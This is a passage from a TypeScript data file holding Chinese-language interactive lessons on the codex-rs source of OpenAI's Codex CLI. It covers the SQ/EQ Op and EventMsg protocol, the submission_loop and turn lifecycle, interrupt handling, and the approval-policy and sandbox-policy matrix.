// OpenAI Codex（openai/codex · codex-rs）交互式源码教程：6 章 · 10 课 · 60 步（与源码思维导图 6 大分支 1:1 对齐）
// 对应仓库：https://github.com/openai/codex
import { chapter, codexSrc, iso, kpi, lesson, steps, swim, tree } from '../../helpers';
import type { Chapter } from '../../../types/lesson';
import { L_CODEX_APP_SERVER, L_CODEX_CONFIG_MCP } from './ch06';

// ---------------------------------------------------------------------------
// CH1 · 1/1 · SQ / EQ 双队列协议（Op 提交与 EventMsg 事件流）
// ---------------------------------------------------------------------------
const L_CODEX_SQ_EQ = lesson(
  'codex-sq-eq',
  'codex-ch01',
  1,
  'Workspace 与双队列协议',
  1,
  1,
  'SQ / EQ 双队列架构：Op 与 EventMsg',
  'OpenAI 将 Codex CLI 用 Rust（codex-rs）重写后，最核心的架构契约不是函数调用，而是异步通道对：提交队列 SQ（Op）与事件队列 EQ（EventMsg）。',
  11,
  '入门',
  [
    { text: '说出 codex-rs 核心 crate 分层（protocol / core / exec / tui / app-server）', completedAtStep: 2 },
    { text: '掌握 Submission Queue（Op）与 Event Queue（EventMsg）的异步解耦机制', completedAtStep: 4 },
    { text: '理解审批往返与中途打断如何通过一对异步通道完成', completedAtStep: 6 },
  ],
  steps([
    {
      shortLabel: '为何重写为 Rust',
      badge: 'PROBLEM',
      title: '零依赖分发 + 原生 OS 沙箱 + 多端协议复用',
      paragraphs: [
        '早期 Node.js 版 CLI 面临启动慢、跨平台沙箱系统调用不便、以及难以同时驱动终端 TUI、桌面 App 和 IDE 扩展的痛点。',
        '`openai/codex` 的 `codex-rs` 工作区采用 Rust 编写：把内核 `codex-core` 彻底做成无 UI 异步状态机，外部所有客户端只通过 `codex-protocol` 定义的强类型 `Op` 和 `EventMsg` 与内核对话。',
      ],
      callout: {
        kind: 'idea',
        title: 'SQ / EQ 是 Codex 的总线',
        text: '客户端向 **SQ（Submission Queue）** 投递 `Submission { id, op }`；内核处理后向 **EQ（Event Queue）** 推送 `Event { id, msg }`。每个事件都携带触发它的提交 `id`，天然可关联。',
      },
      kpis: [
        kpi('实现语言', 'Rust (codex-rs)', 'good'),
        kpi('核心通道', 'SQ (Op) ⇄ EQ (EventMsg)', 'good'),
        kpi('端形态', 'TUI / Exec / App-Server', 'neutral'),
      ],
      scene: iso(
        'codex-rs 双队列协议架构',
        [
          { id: 'tui', x: 70, y: 80, label: 'codex-tui / IDE', sublabel: '终端 UI 或 JSON-RPC App Server', tone: 'blue', size: 'lg', icon: 'terminal' },
          { id: 'sq', x: 400, y: 80, label: 'Submission Queue (SQ)', sublabel: 'async_channel::Sender<Submission>', tone: 'orange', size: 'lg', active: true, icon: 'inbox' },
          { id: 'core', x: 720, y: 215, label: 'codex-core', sublabel: 'submission_loop + Turn 引擎 + 沙箱', tone: 'violet', size: 'lg', active: true, icon: 'cpu' },
          { id: 'eq', x: 400, y: 350, label: 'Event Queue (EQ)', sublabel: 'async_channel::Receiver<Event>', tone: 'green', size: 'lg', active: true, icon: 'refresh-cw' },
        ],
        [
          { from: 'tui', to: 'sq', label: 'submit(Op)', status: 'active', packetCount: 2, packetLabel: 'Op::UserTurn' },
          { from: 'sq', to: 'core', status: 'active', packetCount: 2 },
          { from: 'core', to: 'eq', label: 'send_event()', status: 'active', packetCount: 2, packetLabel: 'EventMsg' },
          { from: 'eq', to: 'tui', label: 'next_event()', status: 'active', packetCount: 2 },
        ],
      ),
    },
    {
      shortLabel: 'Op 枚举指令集',
      badge: 'TECHNIQUE',
      title: 'Op：所有外部意图都被建模为强类型枚举',
      paragraphs: [
        '在 `codex-rs/protocol/src/protocol.rs` 中，客户端能对 Agent 做的一切动作都在 `enum Op` 里穷举定义：提交用户输入（`UserTurn`）、强制打断（`Interrupt`）、回复命令审批（`ExecApproval`）、回复补丁审批（`PatchApproval`）、触发压缩（`Compact`）、优雅关机（`Shutdown`）。',
      ],
      sourceDrawer: codexSrc(
        'codex-protocol 核心 Op 与 EventMsg 契约',
        'codex-rs/protocol/src/protocol.rs',
        'rs',
        `#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(tag = "type", rename_all = "snake_case")]
pub enum Op {
    Interrupt,
    UserTurn {
        items: Vec<UserInput>,
        cwd: PathBuf,
        approval_policy: AskForApproval,
        sandbox_policy: SandboxPolicy,
        model: String,
    },
    ExecApproval { id: String, decision: ReviewDecision },
    PatchApproval { id: String, decision: ReviewDecision },
    Compact,
    Shutdown,
}`,
        '依据 openai/codex 的 codex-rs/protocol/src/protocol.rs 协议结构整理。',
      ),
      kpis: [
        kpi('协议 crate', 'codex-protocol', 'good'),
        kpi('序列化', 'serde tagged JSON', 'good'),
        kpi('安全维度', '随每个 Turn 下发策略', 'good'),
      ],
      scene: tree(
        'codex-rs Workspace 核心 Crate 分层',
        [
          { id: 'ws', x: 500, y: 55, kind: 'root', label: 'codex-rs Workspace', status: 'active' },
          { id: 'proto', x: 170, y: 215, kind: 'service', label: 'codex-protocol', sublabel: 'Op / EventMsg / Policy 类型契约', parentId: 'ws', status: 'done' },
          { id: 'core', x: 500, y: 215, kind: 'plugin', label: 'codex-core', sublabel: 'Codex 会话引擎 · 工具 · 压缩 · 沙箱', parentId: 'ws', status: 'active' },
          { id: 'sbx', x: 830, y: 215, kind: 'tool', label: 'linux-sandbox / seatbelt', sublabel: 'Landlock + seccomp / macOS Seatbelt', parentId: 'ws', status: 'highlight' },
          { id: 'tui', x: 260, y: 400, kind: 'event', label: 'codex-tui / codex-exec', sublabel: '交互终端与 CI 无头运行器', parentId: 'core' },
          { id: 'srv', x: 740, y: 400, kind: 'event', label: 'codex-app-server', sublabel: 'JSON-RPC 驱动桌面端与 IDE', parentId: 'core' },
        ],
        [
          { from: 'ws', to: 'proto' },
          { from: 'ws', to: 'core', animated: true },
          { from: 'ws', to: 'sbx' },
          { from: 'core', to: 'tui', animated: true },
          { from: 'core', to: 'srv', animated: true },
        ],
      ),
    },
    {
      shortLabel: 'EventMsg 事件流',
      badge: 'TECHNIQUE',
      title: 'EventMsg：从 Token 增量到审批请求全走单向推送',
      paragraphs: [
        '与 `Op` 对称，`EventMsg` 涵盖了内核向外汇报的一切事件：`TaskStarted`、`AgentMessageDelta`、`ExecCommandBegin`、`ExecCommandOutputDelta`、`ExecApprovalRequest`、`TurnDiff`、`TokenCount`、`TaskComplete`。',
        '前端不需要猜测当前处于哪一步——只要按 `EventMsg` 更新本地渲染状态即可。',
      ],
      kpis: [
        kpi('流式颗粒度', '文本与命令输出双流', 'good'),
        kpi('变更反馈', 'TurnDiff 实时推送', 'good'),
        kpi('审批触发', 'ExecApprovalRequest', 'warn'),
      ],
      scene: swim(
        '审批交互在 SQ / EQ 双通道上的完整往返',
        [
          { id: 'ui', label: '客户端 (TUI/IDE)', tone: 'blue' },
          { id: 'sq', label: 'SQ (Op)', tone: 'orange' },
          { id: 'core', label: 'codex-core', tone: 'violet' },
          { id: 'eq', label: 'EQ (EventMsg)', tone: 'green' },
        ],
        [
          { id: 'a1', laneId: 'ui', start: 4, end: 18, label: '发送 UserTurn', tone: 'blue', status: 'done' },
          { id: 'a2', laneId: 'sq', start: 14, end: 26, label: 'Op::UserTurn', tone: 'orange', status: 'done' },
          { id: 'a3', laneId: 'core', start: 26, end: 46, label: 'LLM 拟执行高危命令 → 挂起', tone: 'violet', status: 'blocked' },
          { id: 'a4', laneId: 'eq', start: 42, end: 56, label: 'ExecApprovalRequest', tone: 'orange', status: 'running' },
          { id: 'a5', laneId: 'ui', start: 54, end: 70, label: '用户点击允许', tone: 'blue', status: 'done' },
          { id: 'a6', laneId: 'sq', start: 66, end: 78, label: 'Op::ExecApproval', tone: 'orange', status: 'done' },
          { id: 'a7', laneId: 'core', start: 78, end: 96, label: 'oneshot 唤醒 → 沙箱执行', tone: 'green', status: 'running' },
        ],
      ),
    },
    {
      shortLabel: '非阻塞审批挂起',
      badge: 'SOLUTION',
      title: 'oneshot Channel：审批等待绝不阻塞 SQ 接收 Interrupt',
      paragraphs: [
        '这里有一个极其经典的并发工程细节：当执行中的 Turn 需要人工审批时，它向 EQ 发出 `ExecApprovalRequest`，然后在内存中登记一个 `tokio::sync::oneshot::Sender` 并 `.await` 接收端。',
        '因为 `submission_loop` 独立在主协程持续消费 SQ，如果用户在审批弹窗前不想点确认、直接按 `Esc` 发送 `Op::Interrupt`，`submission_loop` 依然能立刻收到并取消整个任务，绝不会死锁！',
      ],
      callout: {
        kind: 'tip',
        title: '对比传统同步 stdin 询问',
        text: '同步阻塞读 stdin 会卡死整条事件循环；Codex 用 `pending_approvals: HashMap<call_id, oneshot::Sender>` 实现完全非阻塞的多路复用挂起与随时取消。',
      },
      kpis: [
        kpi('挂起原语', 'tokio::sync::oneshot', 'good'),
        kpi('中断响应', '随时可 Op::Interrupt', 'good'),
        kpi('死锁风险', '0', 'good'),
      ],
      scene: iso(
        'pending_approvals 非阻塞审批唤醒表',
        [
          { id: 'turn', x: 80, y: 120, label: 'Running Turn Task', sublabel: 'await rx (挂起等待审批)', tone: 'violet', size: 'lg', active: true, icon: 'pause' },
          { id: 'map', x: 430, y: 120, label: 'pending_approvals', sublabel: 'HashMap<id, oneshot::Sender>', tone: 'orange', size: 'lg', active: true, icon: 'database' },
          { id: 'sub', x: 430, y: 340, label: 'submission_loop', sublabel: '永不阻塞，持续读 SQ', tone: 'blue', size: 'lg', icon: 'refresh-cw' },
          { id: 'wake', x: 780, y: 225, label: '唤醒继续 / CancellationToken 取消', tone: 'green', icon: 'check-circle' },
        ],
        [
          { from: 'turn', to: 'map', label: '插入 tx 并 await rx', status: 'active', packetCount: 1 },
          { from: 'sub', to: 'map', label: '收到 Op::ExecApproval', status: 'active', packetCount: 2, packetLabel: 'tx.send(decision)' },
          { from: 'map', to: 'wake', status: 'active', packetCount: 1 },
        ],
      ),
    },
    {
      shortLabel: '跨进程协议一致',
      badge: 'INSIGHT',
      title: '一套协议打通 CLI、CI 与 IDE 插件',
      paragraphs: [
        '因为 SQ/EQ 的消息全都能零损失序列化成 JSON，`codex-tui` 在进程内直连 Rust channel，而 `codex-app-server` 只需把同一对 `Op`/`EventMsg` 桥接到 stdio JSON-RPC，立刻就能服务 VS Code、Cursor 或桌面客户端。',
      ],
      kpis: [
        kpi('进程内模式', 'async_channel 直连', 'good'),
        kpi('跨进程模式', 'JSON-RPC (app-server)', 'good'),
        kpi('行为一致性', '100%', 'good'),
      ],
      scene: iso(
        '同一内核驱动进程内 TUI 与跨进程 App Server',
        [
          { id: 'core', x: 380, y: 215, label: 'codex-core (SQ/EQ)', tone: 'violet', size: 'lg', active: true, icon: 'cpu' },
          { id: 'tui', x: 70, y: 105, label: 'codex-tui', sublabel: '进程内零拷贝直连', tone: 'blue', icon: 'terminal' },
          { id: 'ci', x: 70, y: 325, label: 'codex exec', sublabel: 'CI 自动化非交互运行', tone: 'green', icon: 'package' },
          { id: 'ide', x: 730, y: 215, label: 'codex-app-server', sublabel: 'JSON-RPC 桥接 IDE/Desktop', tone: 'orange', size: 'lg', icon: 'globe' },
        ],
        [
          { from: 'tui', to: 'core', packetCount: 1 },
          { from: 'ci', to: 'core', packetCount: 1 },
          { from: 'core', to: 'ide', status: 'active', packetCount: 2, packetLabel: 'JSON-RPC' },
        ],
      ),
    },
    {
      shortLabel: '协议复盘',
      badge: 'RECAP',
      title: 'SQ / EQ 双队列协议复盘',
      paragraphs: [
        '把核心引擎彻底变成「吃 Op、吐 EventMsg」的异步状态机，让 Codex 天然具备可中断、可远程化、可重放的工业级底座。',
      ],
      recapTable: [
        { question: '为什么不让 UI 直接调用 core 的执行函数？', decision: '强制走 SQ (Op) 和 EQ (EventMsg) 异步通道', because: '彻底解耦 UI 与并发任务调度，同一内核无缝复用给 TUI、CI 与 IDE。' },
        { question: '等待人类审批时如何做到随时可取消？', decision: 'submission_loop 永不阻塞，审批通过 oneshot 挂起子任务', because: 'Op::Interrupt 始终能立即被主循环消费并触发取消令牌。' },
        { question: '为什么每个 Turn 都显式携带策略字段？', decision: 'UserTurn 内含 approval_policy 与 sandbox_policy', because: '支持会话中途动态收紧或放宽权限，每轮权限状态自描述。' },
      ],
      kpis: [
        kpi('通道模型', 'SQ / EQ', 'good'),
        kpi('审批并发', 'oneshot 非阻塞', 'good'),
        kpi('跨端复用', 'TUI / CI / RPC', 'good'),
      ],
      scene: iso('SQ/EQ 复盘', [
        { id: 'a', x: 180, y: 200, label: 'SQ (Op)', tone: 'orange' },
        { id: 'b', x: 480, y: 200, label: 'codex-core', tone: 'violet', active: true },
        { id: 'c', x: 780, y: 200, label: 'EQ (EventMsg)', tone: 'green' },
      ], [
        { from: 'a', to: 'b', packetCount: 1 },
        { from: 'b', to: 'c', packetCount: 1 },
      ]),
    },
  ]),
);

// ---------------------------------------------------------------------------
// CH1 · 2/2 · submission_loop 与 Turn 执行生命周期
// ---------------------------------------------------------------------------
const L_CODEX_TURN = lesson(
  'codex-turn-loop',
  'codex-ch02',
  2,
  'Core 控制面与 Turn 循环',
  1,
  1,
  'submission_loop 与 Turn 执行生命周期',
  '深入 codex-rs/core/src/codex.rs：看清一次 UserTurn 如何派生独立 Tokio 任务、流式消费 Responses API、并行调度工具并在打断时干净清理。',
  11,
  '核心',
  [
    { text: '理解 submission_loop 与派生 Turn Task 的并发协作模型', completedAtStep: 2 },
    { text: '掌握单个 Turn 内「流式推理 → 工具路由器 → 结果回填」的闭环', completedAtStep: 4 },
    { text: '理解 CancellationToken 如何级联终止模型流与沙箱子进程', completedAtStep: 6 },
  ],
  steps([
    {
      shortLabel: '主循环与子任务',
      badge: 'PROBLEM',
      title: '如果 submission_loop 亲自 await 模型请求会怎样？',
      paragraphs: [
        '如果读取 SQ 的主循环直接 `await` 模型网络请求或 30 秒的 `cargo test`，那在这 30 秒里，用户发来的 `Op::Interrupt`、`Op::ExecApproval` 甚至动态策略更新全都会被堵在队列外面。',
        '因此 `codex.rs` 把控制面（`submission_loop`）与执行面（`ActiveTurn` 独立任务）彻底分离。',
      ],
      kpis: [
        kpi('控制面', 'submission_loop', 'good'),
        kpi('执行面', 'tokio::spawn TurnTask', 'good'),
        kpi('取消原语', 'CancellationToken', 'good'),
      ],
      scene: iso(
        '控制面 submission_loop 与执行面 TurnTask 分离',
        [
          { id: 'sq', x: 70, y: 215, label: 'SQ 通道', tone: 'orange', icon: 'inbox' },
          { id: 'loop', x: 360, y: 215, label: 'submission_loop', sublabel: '微秒级分发 Op · 永不长时间阻塞', tone: 'blue', size: 'lg', active: true, icon: 'refresh-cw' },
          { id: 'task', x: 720, y: 115, label: 'ActiveTurn Task', sublabel: '独立异步任务跑 LLM + Tools', tone: 'violet', size: 'lg', active: true, icon: 'cpu' },
          { id: 'tok', x: 720, y: 325, label: 'CancellationToken', sublabel: 'Interrupt 时一键广播取消', tone: 'rose', icon: 'shield' },
        ],
        [
          { from: 'sq', to: 'loop', status: 'active', packetCount: 2, packetLabel: 'Op' },
          { from: 'loop', to: 'task', label: 'spawn_task()', status: 'active', packetCount: 1 },
          { from: 'loop', to: 'tok', label: 'abort_all_tasks()', dashed: true, packetCount: 1 },
          { from: 'tok', to: 'task', label: 'cancel()', status: 'error', dashed: true, packetCount: 1 },
        ],
      ),
    },
    {
      shortLabel: 'submission_loop 源码',
      badge: 'TECHNIQUE',
      title: 'codex.rs：按 Op 变体精准路由',
      paragraphs: [
        '在 `codex-rs/core/src/codex.rs` 中，`submission_loop` 不断从 `rx_sub.recv().await` 取出 `Submission`，根据 `op` 类型分发给对应处理器：遇到 `UserTurn` 就先中止旧任务再派生新 `TurnContext`；遇到 `Interrupt` 就立刻触发 `CancellationToken`；遇到 `ExecApproval` 就唤醒挂起中的审批等待者。',
      ],
      sourceDrawer: codexSrc(
        'submission_loop 分发循环示意',
        'codex-rs/core/src/codex.rs',
        'rs',
        `async fn submission_loop(sess: Arc<Session>, rx_sub: Receiver<Submission>) {
    while let Ok(sub) = rx_sub.recv().await {
        match sub.op {
            Op::Interrupt => sess.interrupt_task().await,
            Op::UserTurn { items, cwd, approval_policy, sandbox_policy, model, .. } => {
                let turn_ctx = sess.new_turn_context(sub.id, cwd, approval_policy, sandbox_policy, model);
                sess.spawn_turn(turn_ctx, items).await;
            }
            Op::ExecApproval { id, decision } => sess.notify_approval(&id, decision).await,
            Op::Compact => sess.spawn_compact_task(sub.id).await,
            Op::Shutdown => { sess.interrupt_task().await; break; }
            _ => {}
        }
    }
}`,
        '控制面只做快速状态登记与任务派发，耗时 I/O 全在子任务中执行。',
      ),
      kpis: [
        kpi('状态容器', 'Arc<Session>', 'neutral'),
        kpi('单轮上下文', 'TurnContext', 'good'),
        kpi('并发安全', 'Mutex + RwLock', 'neutral'),
      ],
      scene: swim(
        '一次完整 Turn 的内部循环步骤',
        [
          { id: 'ctx', label: 'TurnContext', tone: 'blue' },
          { id: 'llm', label: 'Responses API', tone: 'violet' },
          { id: 'router', label: 'ToolRouter', tone: 'orange' },
        ],
        [
          { id: 't1', laneId: 'ctx', start: 4, end: 22, label: '组装历史 + AGENTS.md + 工具表', tone: 'blue', status: 'done' },
          { id: 't2', laneId: 'llm', start: 24, end: 52, label: '流式 SSE 产出推理与 tool_call', tone: 'violet', status: 'running' },
          { id: 't3', laneId: 'router', start: 54, end: 78, label: '审批门 → 沙箱执行 → 采集输出', tone: 'orange', status: 'done' },
          { id: 't4', laneId: 'ctx', start: 80, end: 96, label: '写回 ResponseItem → 下一轮采样', tone: 'green', status: 'done' },
        ],
      ),
    },
    {
      shortLabel: 'Responses API 与历史项',
      badge: 'SOLUTION',
      title: 'ResponseItem 驱动的原生多轮历史',
      paragraphs: [
        'Codex 直接基于 OpenAI Responses API 的结构化 `ResponseItem`（`Message`、`Reasoning`、`FunctionCall`、`FunctionCallOutput`、`LocalShellCall`）维护 `ConversationHistory`。',
        '每一轮流式到达的增量一边通过 EQ 推给 UI，一边在 `ResponseEvent::OutputItemDone` 时落入会话历史并同步写入 Rollout JSONL 日志文件，支持随时 `--resume` 恢复会话。',
      ],
      kpis: [
        kpi('协议格式', 'Responses API Items', 'good'),
        kpi('会话落盘', 'Rollout Recorder JSONL', 'good'),
        kpi('恢复能力', 'codex resume', 'good'),
      ],
      scene: iso(
        'Responses API 增量流双写路径',
        [
          { id: 'sse', x: 80, y: 215, label: 'ModelClient SSE', sublabel: 'OutputTextDelta / OutputItemDone', tone: 'violet', size: 'lg', active: true, icon: 'brain' },
          { id: 'eq', x: 480, y: 100, label: 'EQ 实时推送 UI', sublabel: 'AgentMessageDelta / ReasoningDelta', tone: 'blue', size: 'lg', icon: 'terminal' },
          { id: 'hist', x: 480, y: 330, label: 'History + RolloutRecorder', sublabel: '持久化 ResponseItem 供下轮与 resume', tone: 'green', size: 'lg', active: true, icon: 'database' },
        ],
        [
          { from: 'sse', to: 'eq', label: '毫秒级流显', status: 'active', packetCount: 2 },
          { from: 'sse', to: 'hist', label: 'Item 完成落盘', status: 'active', packetCount: 1 },
        ],
      ),
    },
    {
      shortLabel: 'ToolRouter 并发分发',
      badge: 'TECHNIQUE',
      title: '读写分离锁：只读工具可并行，写盘/Shell 串行护航',
      paragraphs: [
        '模型单轮经常同时发出多个工具调用（例如同时读取 4 个文件，或者边改代码边跑测试）。Codex 的工具调度器按工具是否支持并发（`supports_parallel`）分类：只读查询拿读锁并行跑，文件写入或 Shell 执行拿写锁严格串行，兼顾速度与文件系统一致性。',
      ],
      kpis: [
        kpi('只读工具', 'RwLock 读锁并行', 'good'),
        kpi('写入/Shell', 'RwLock 写锁串行', 'good'),
        kpi('扩展工具', '原生集成 MCP 工具', 'neutral'),
      ],
      scene: swim(
        'ToolRouter 基于 RwLock 的并行与串行调度',
        [
          { id: 'r1', label: 'read_file #1', tone: 'blue' },
          { id: 'r2', label: 'read_file #2', tone: 'blue' },
          { id: 'w1', label: 'apply_patch', tone: 'orange' },
          { id: 'sh', label: 'shell (cargo test)', tone: 'violet' },
        ],
        [
          { id: 'b1', laneId: 'r1', start: 6, end: 36, label: '读锁并行执行', tone: 'blue', status: 'parallel' },
          { id: 'b2', laneId: 'r2', start: 6, end: 34, label: '读锁并行执行', tone: 'blue', status: 'parallel' },
          { id: 'b3', laneId: 'w1', start: 40, end: 64, label: '写锁独占落盘', tone: 'orange', status: 'done' },
          { id: 'b4', laneId: 'sh', start: 68, end: 95, label: '写锁沙箱内验证测试', tone: 'violet', status: 'running' },
        ],
      ),
    },
    {
      shortLabel: '中途打断与清理',
      badge: 'INSIGHT',
      title: 'Op::Interrupt：级联取消流、审批与沙箱进程组',
      paragraphs: [
        '当用户按下 `Esc` 触发 `Op::Interrupt`，`CancellationToken::cancel()` 会同时在三条战线生效：1. 立即切断 HTTP SSE 连接；2. 清空挂起中的审批表；3. 向正在运行的沙箱子进程组发送 `SIGKILL` 避免僵尸进程残留；随后向 EQ 发射 `TurnAborted`，安全回到待命状态。',
      ],
      kpis: [
        kpi('僵尸进程', '0（杀整个进程组）', 'good'),
        kpi('断流响应', '即时', 'good'),
        kpi('历史状态', '保留已完成项，收口干净', 'good'),
      ],
      scene: iso(
        'Op::Interrupt 三路级联取消',
        [
          { id: 'int', x: 80, y: 215, label: 'Op::Interrupt', tone: 'rose', size: 'lg', active: true, icon: 'alert-triangle' },
          { id: 's1', x: 470, y: 80, label: '切断 LLM SSE 流', tone: 'blue', icon: 'globe' },
          { id: 's2', x: 470, y: 215, label: '释放 pending_approvals', tone: 'orange', icon: 'shield' },
          { id: 's3', x: 470, y: 350, label: 'SIGKILL 沙箱子进程组', tone: 'rose', icon: 'terminal' },
          { id: 'done', x: 800, y: 215, label: 'EventMsg::TurnAborted', tone: 'green', icon: 'check-circle' },
        ],
        [
          { from: 'int', to: 's1', status: 'error', packetCount: 1 },
          { from: 'int', to: 's2', status: 'error', packetCount: 1 },
          { from: 'int', to: 's3', status: 'error', packetCount: 1 },
          { from: 's1', to: 'done', packetCount: 1 },
          { from: 's2', to: 'done', packetCount: 1 },
          { from: 's3', to: 'done', packetCount: 1 },
        ],
      ),
    },
    {
      shortLabel: 'Turn 复盘',
      badge: 'RECAP',
      title: 'Turn 生命周期复盘',
      paragraphs: [
        'Codex 用 Rust 的 `tokio` 任务隔离、`RwLock` 读写分离工具调度和 `CancellationToken` 级联清理，让高频编码循环具备极高的并发健壮性。',
      ],
      recapTable: [
        { question: '控制面和执行面为什么要拆成两个任务？', decision: 'submission_loop 只做分发，实际 Turn 在独立任务运行', because: '防止长耗时模型请求或命令执行阻塞 Interrupt 与审批响应。' },
        { question: '多个工具调用如何兼顾速度与安全？', decision: '只读工具并行跑，写盘与 Shell 独占串行', because: '大幅加速代码探索，同时防止并发改写导致文件撕裂。' },
        { question: '打断时如何防止后台构建进程泄漏？', decision: 'CancellationToken 触发后直接终止整个子进程组', because: '杜绝孤儿进程持续占用 CPU 或锁死文件句柄。' },
      ],
      kpis: [
        kpi('任务隔离', 'Tokio Spawn', 'good'),
        kpi('调度锁', '读并行 / 写串行', 'good'),
        kpi('中断清理', '三路级联', 'good'),
      ],
      scene: iso('Turn 复盘', [
        { id: 'a', x: 180, y: 200, label: 'submission_loop', tone: 'blue' },
        { id: 'b', x: 480, y: 200, label: 'ActiveTurn', tone: 'violet', active: true },
        { id: 'c', x: 780, y: 200, label: 'ToolRouter', tone: 'orange' },
      ], [
        { from: 'a', to: 'b', packetCount: 1 },
        { from: 'b', to: 'c', packetCount: 1 },
      ]),
    },
  ]),
);

// ---------------------------------------------------------------------------
// CH2 · 1/2 · AskForApproval 与 SandboxPolicy 正交分离（★ 带互动实验台）
// ---------------------------------------------------------------------------
const L_CODEX_POLICY = lesson(
  'codex-approval-policy',
  'codex-ch03',
  3,
  '二维正交策略与 ExecPolicy',
  1,
  2,
  'AskForApproval × SandboxPolicy 正交安全矩阵',
  'Codex 安全架构最核心的洞见：把「什么时候问人类（治理面）」和「操作系统允许进程干什么（物理面）」彻底拆成两个正交枚举。',
  14,
  '核心',
  [
    { text: '区分 AskForApproval（治理面）与 SandboxPolicy（物理面）的职责', completedAtStep: 2 },
    { text: '掌握 read-only / workspace-write / danger-full-access 三档沙箱能力边界', completedAtStep: 4 },
    { text: '理解典型组合（如 on-request + workspace-write）如何在自动化与安全间取平衡', completedAtStep: 6 },
  ],
  steps([
    {
      shortLabel: '混为一谈的陷阱',
      badge: 'PROBLEM',
      title: '单轴「安全等级」为什么总是不够用？',
      paragraphs: [
        '很多工具只提供一个粗粒度的 `--yolo` 或「低/中/高」安全档位。但真实场景需求是二维的：',
        '在 CI 无人值守环境里，你需要「**永远不弹窗问人类**（`never`），但**绝对锁死只能写当前工作区且断网**（`workspace-write`）」；而在交互探索陌生产业代码时，你可能希望「**只读沙箱**（`read-only`）+ **遇写操作先询问升级**（`on-request`）」。',
      ],
      callout: {
        kind: 'idea',
        title: '二维正交模型',
        text: '`AskForApproval` 决定**何时暂停征求人工许可**；`SandboxPolicy` 决定**OS 内核给子进程划出的物理围栏**。两者独立组合，互不替代！',
      },
      kpis: [
        kpi('治理轴', 'AskForApproval', 'good'),
        kpi('物理轴', 'SandboxPolicy', 'good'),
        kpi('推荐默认', 'on-request + workspace-write', 'good'),
      ],
      scene: iso(
        'AskForApproval × SandboxPolicy 二维正交模型',
        [
          { id: 'ask', x: 100, y: 110, label: 'AskForApproval（治理面）', sublabel: 'untrusted · on-request · never', tone: 'orange', size: 'lg', active: true, icon: 'shield' },
          { id: 'sbx', x: 100, y: 325, label: 'SandboxPolicy（物理面）', sublabel: 'read-only · workspace-write · danger-full-access', tone: 'violet', size: 'lg', active: true, icon: 'lock' },
          { id: 'gate', x: 560, y: 215, label: '命令执行决策引擎', sublabel: '先判定是否需审批 → 再以对应沙箱边界启动进程', tone: 'green', size: 'lg', active: true, icon: 'cpu' },
        ],
        [
          { from: 'ask', to: 'gate', label: '是否弹窗？', status: 'active', packetCount: 2, packetLabel: '治理策略' },
          { from: 'sbx', to: 'gate', label: '内核围栏？', status: 'active', packetCount: 2, packetLabel: '物理边界' },
        ],
      ),
    },
    {
      shortLabel: '两大枚举源码',
      badge: 'TECHNIQUE',
      title: 'protocol.rs 中的双正交枚举定义',
      paragraphs: [
        '在 `codex-rs/protocol/src/protocol.rs` 中，这两个维度被定义为独立类型并支持在 `~/.codex/config.toml` 或 CLI 参数（`--ask-for-approval` / `--sandbox`）中分别指定：',
      ],
      sourceDrawer: codexSrc(
        'AskForApproval 与 SandboxPolicy 定义',
        'codex-rs/protocol/src/protocol.rs',
        'rs',
        `#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum AskForApproval {
    /// 仅已知安全只读命令自动跑，其余一律询问
    UnlessTrusted,
    /// 模型在沙箱内自由跑；仅需突破沙箱或敏感命令时询问
    OnRequest,
    /// 永不询问（CI/无人值守场景，全靠 OS 沙箱兜底）
    Never,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(tag = "mode", rename_all = "kebab-case")]
pub enum SandboxPolicy {
    ReadOnly,
    WorkspaceWrite { writable_roots: Vec<PathBuf>, network_access: bool },
    DangerFullAccess,
}`,
        '将审批策略与内核沙箱策略解耦后，即使 AskForApproval::Never，WorkspaceWrite 依然牢牢锁死系统目录与外网。',
      ),
      kpis: [
        kpi('审批档位', '3+ 种模式', 'neutral'),
        kpi('沙箱档位', '3 种物理级别', 'good'),
        kpi('默认网络', 'network_access: false', 'good'),
      ],
      scene: iso(
        '三种 SandboxPolicy 的物理访问边界',
        [
          { id: 'ro', x: 70, y: 205, label: 'ReadOnly', sublabel: '全盘只读 · 禁写 · 断网', tone: 'blue', size: 'lg', icon: 'eye' },
          { id: 'ww', x: 390, y: 205, label: 'WorkspaceWrite', sublabel: '仅工作区可写 · .git 只读保护 · 默认断网', tone: 'green', size: 'lg', active: true, icon: 'lock' },
          { id: 'fa', x: 710, y: 205, label: 'DangerFullAccess', sublabel: '无 OS 沙箱限制（高危显式开启）', tone: 'rose', size: 'lg', icon: 'alert-triangle' },
        ],
        [
          { from: 'ro', to: 'ww', label: '放开工作区写权限', packetCount: 1 },
          { from: 'ww', to: 'fa', label: '解除沙箱（需显式授权）', dashed: true, packetCount: 1 },
        ],
      ),
    },
    {
      shortLabel: '黄金组合分析',
      badge: 'SOLUTION',
      title: '四大经典场景该怎么配这对参数？',
      paragraphs: [
        '1. **日常本地开发（推荐默认）**：`on-request` + `workspace-write` —— 改代码、跑单测全程丝滑自动放行；一旦需要 `npm install`（联网）或改工作区外文件才弹窗。',
        '2. **陌生代码审查**：`untrusted` + `read-only` —— 连 `bash` 里的非常规命令都要确认，且内核物理禁止任何写盘。',
        '3. **CI / GitHub Actions 无人值守**：`never` + `workspace-write` —— 无人按键也不卡死，但越界写盘/联网会被内核硬拒。',
      ],
      kpis: [
        kpi('日常推荐', 'on-request + workspace-write', 'good'),
        kpi('CI 无人值守', 'never + workspace-write', 'good'),
        kpi('只读审计', 'untrusted + read-only', 'neutral'),
      ],
      scene: swim(
        '同一条命令在不同策略组合下的命运',
        [
          { id: 'dev', label: '日常 (on-request + ww)', tone: 'green' },
          { id: 'ci', label: 'CI (never + ww)', tone: 'blue' },
          { id: 'aud', label: '审计 (untrusted + ro)', tone: 'orange' },
        ],
        [
          { id: 'd1', laneId: 'dev', start: 5, end: 42, label: 'cargo test → 自动沙箱放行', tone: 'green', status: 'done' },
          { id: 'd2', laneId: 'dev', start: 48, end: 92, label: 'curl 外网 → 弹窗问是否提权', tone: 'orange', status: 'queued' },
          { id: 'c1', laneId: 'ci', start: 5, end: 42, label: 'cargo test → 自动沙箱放行', tone: 'green', status: 'done' },
          { id: 'c2', laneId: 'ci', start: 48, end: 92, label: 'curl 外网 → 内核直接 EPERM 拒绝', tone: 'rose', status: 'blocked' },
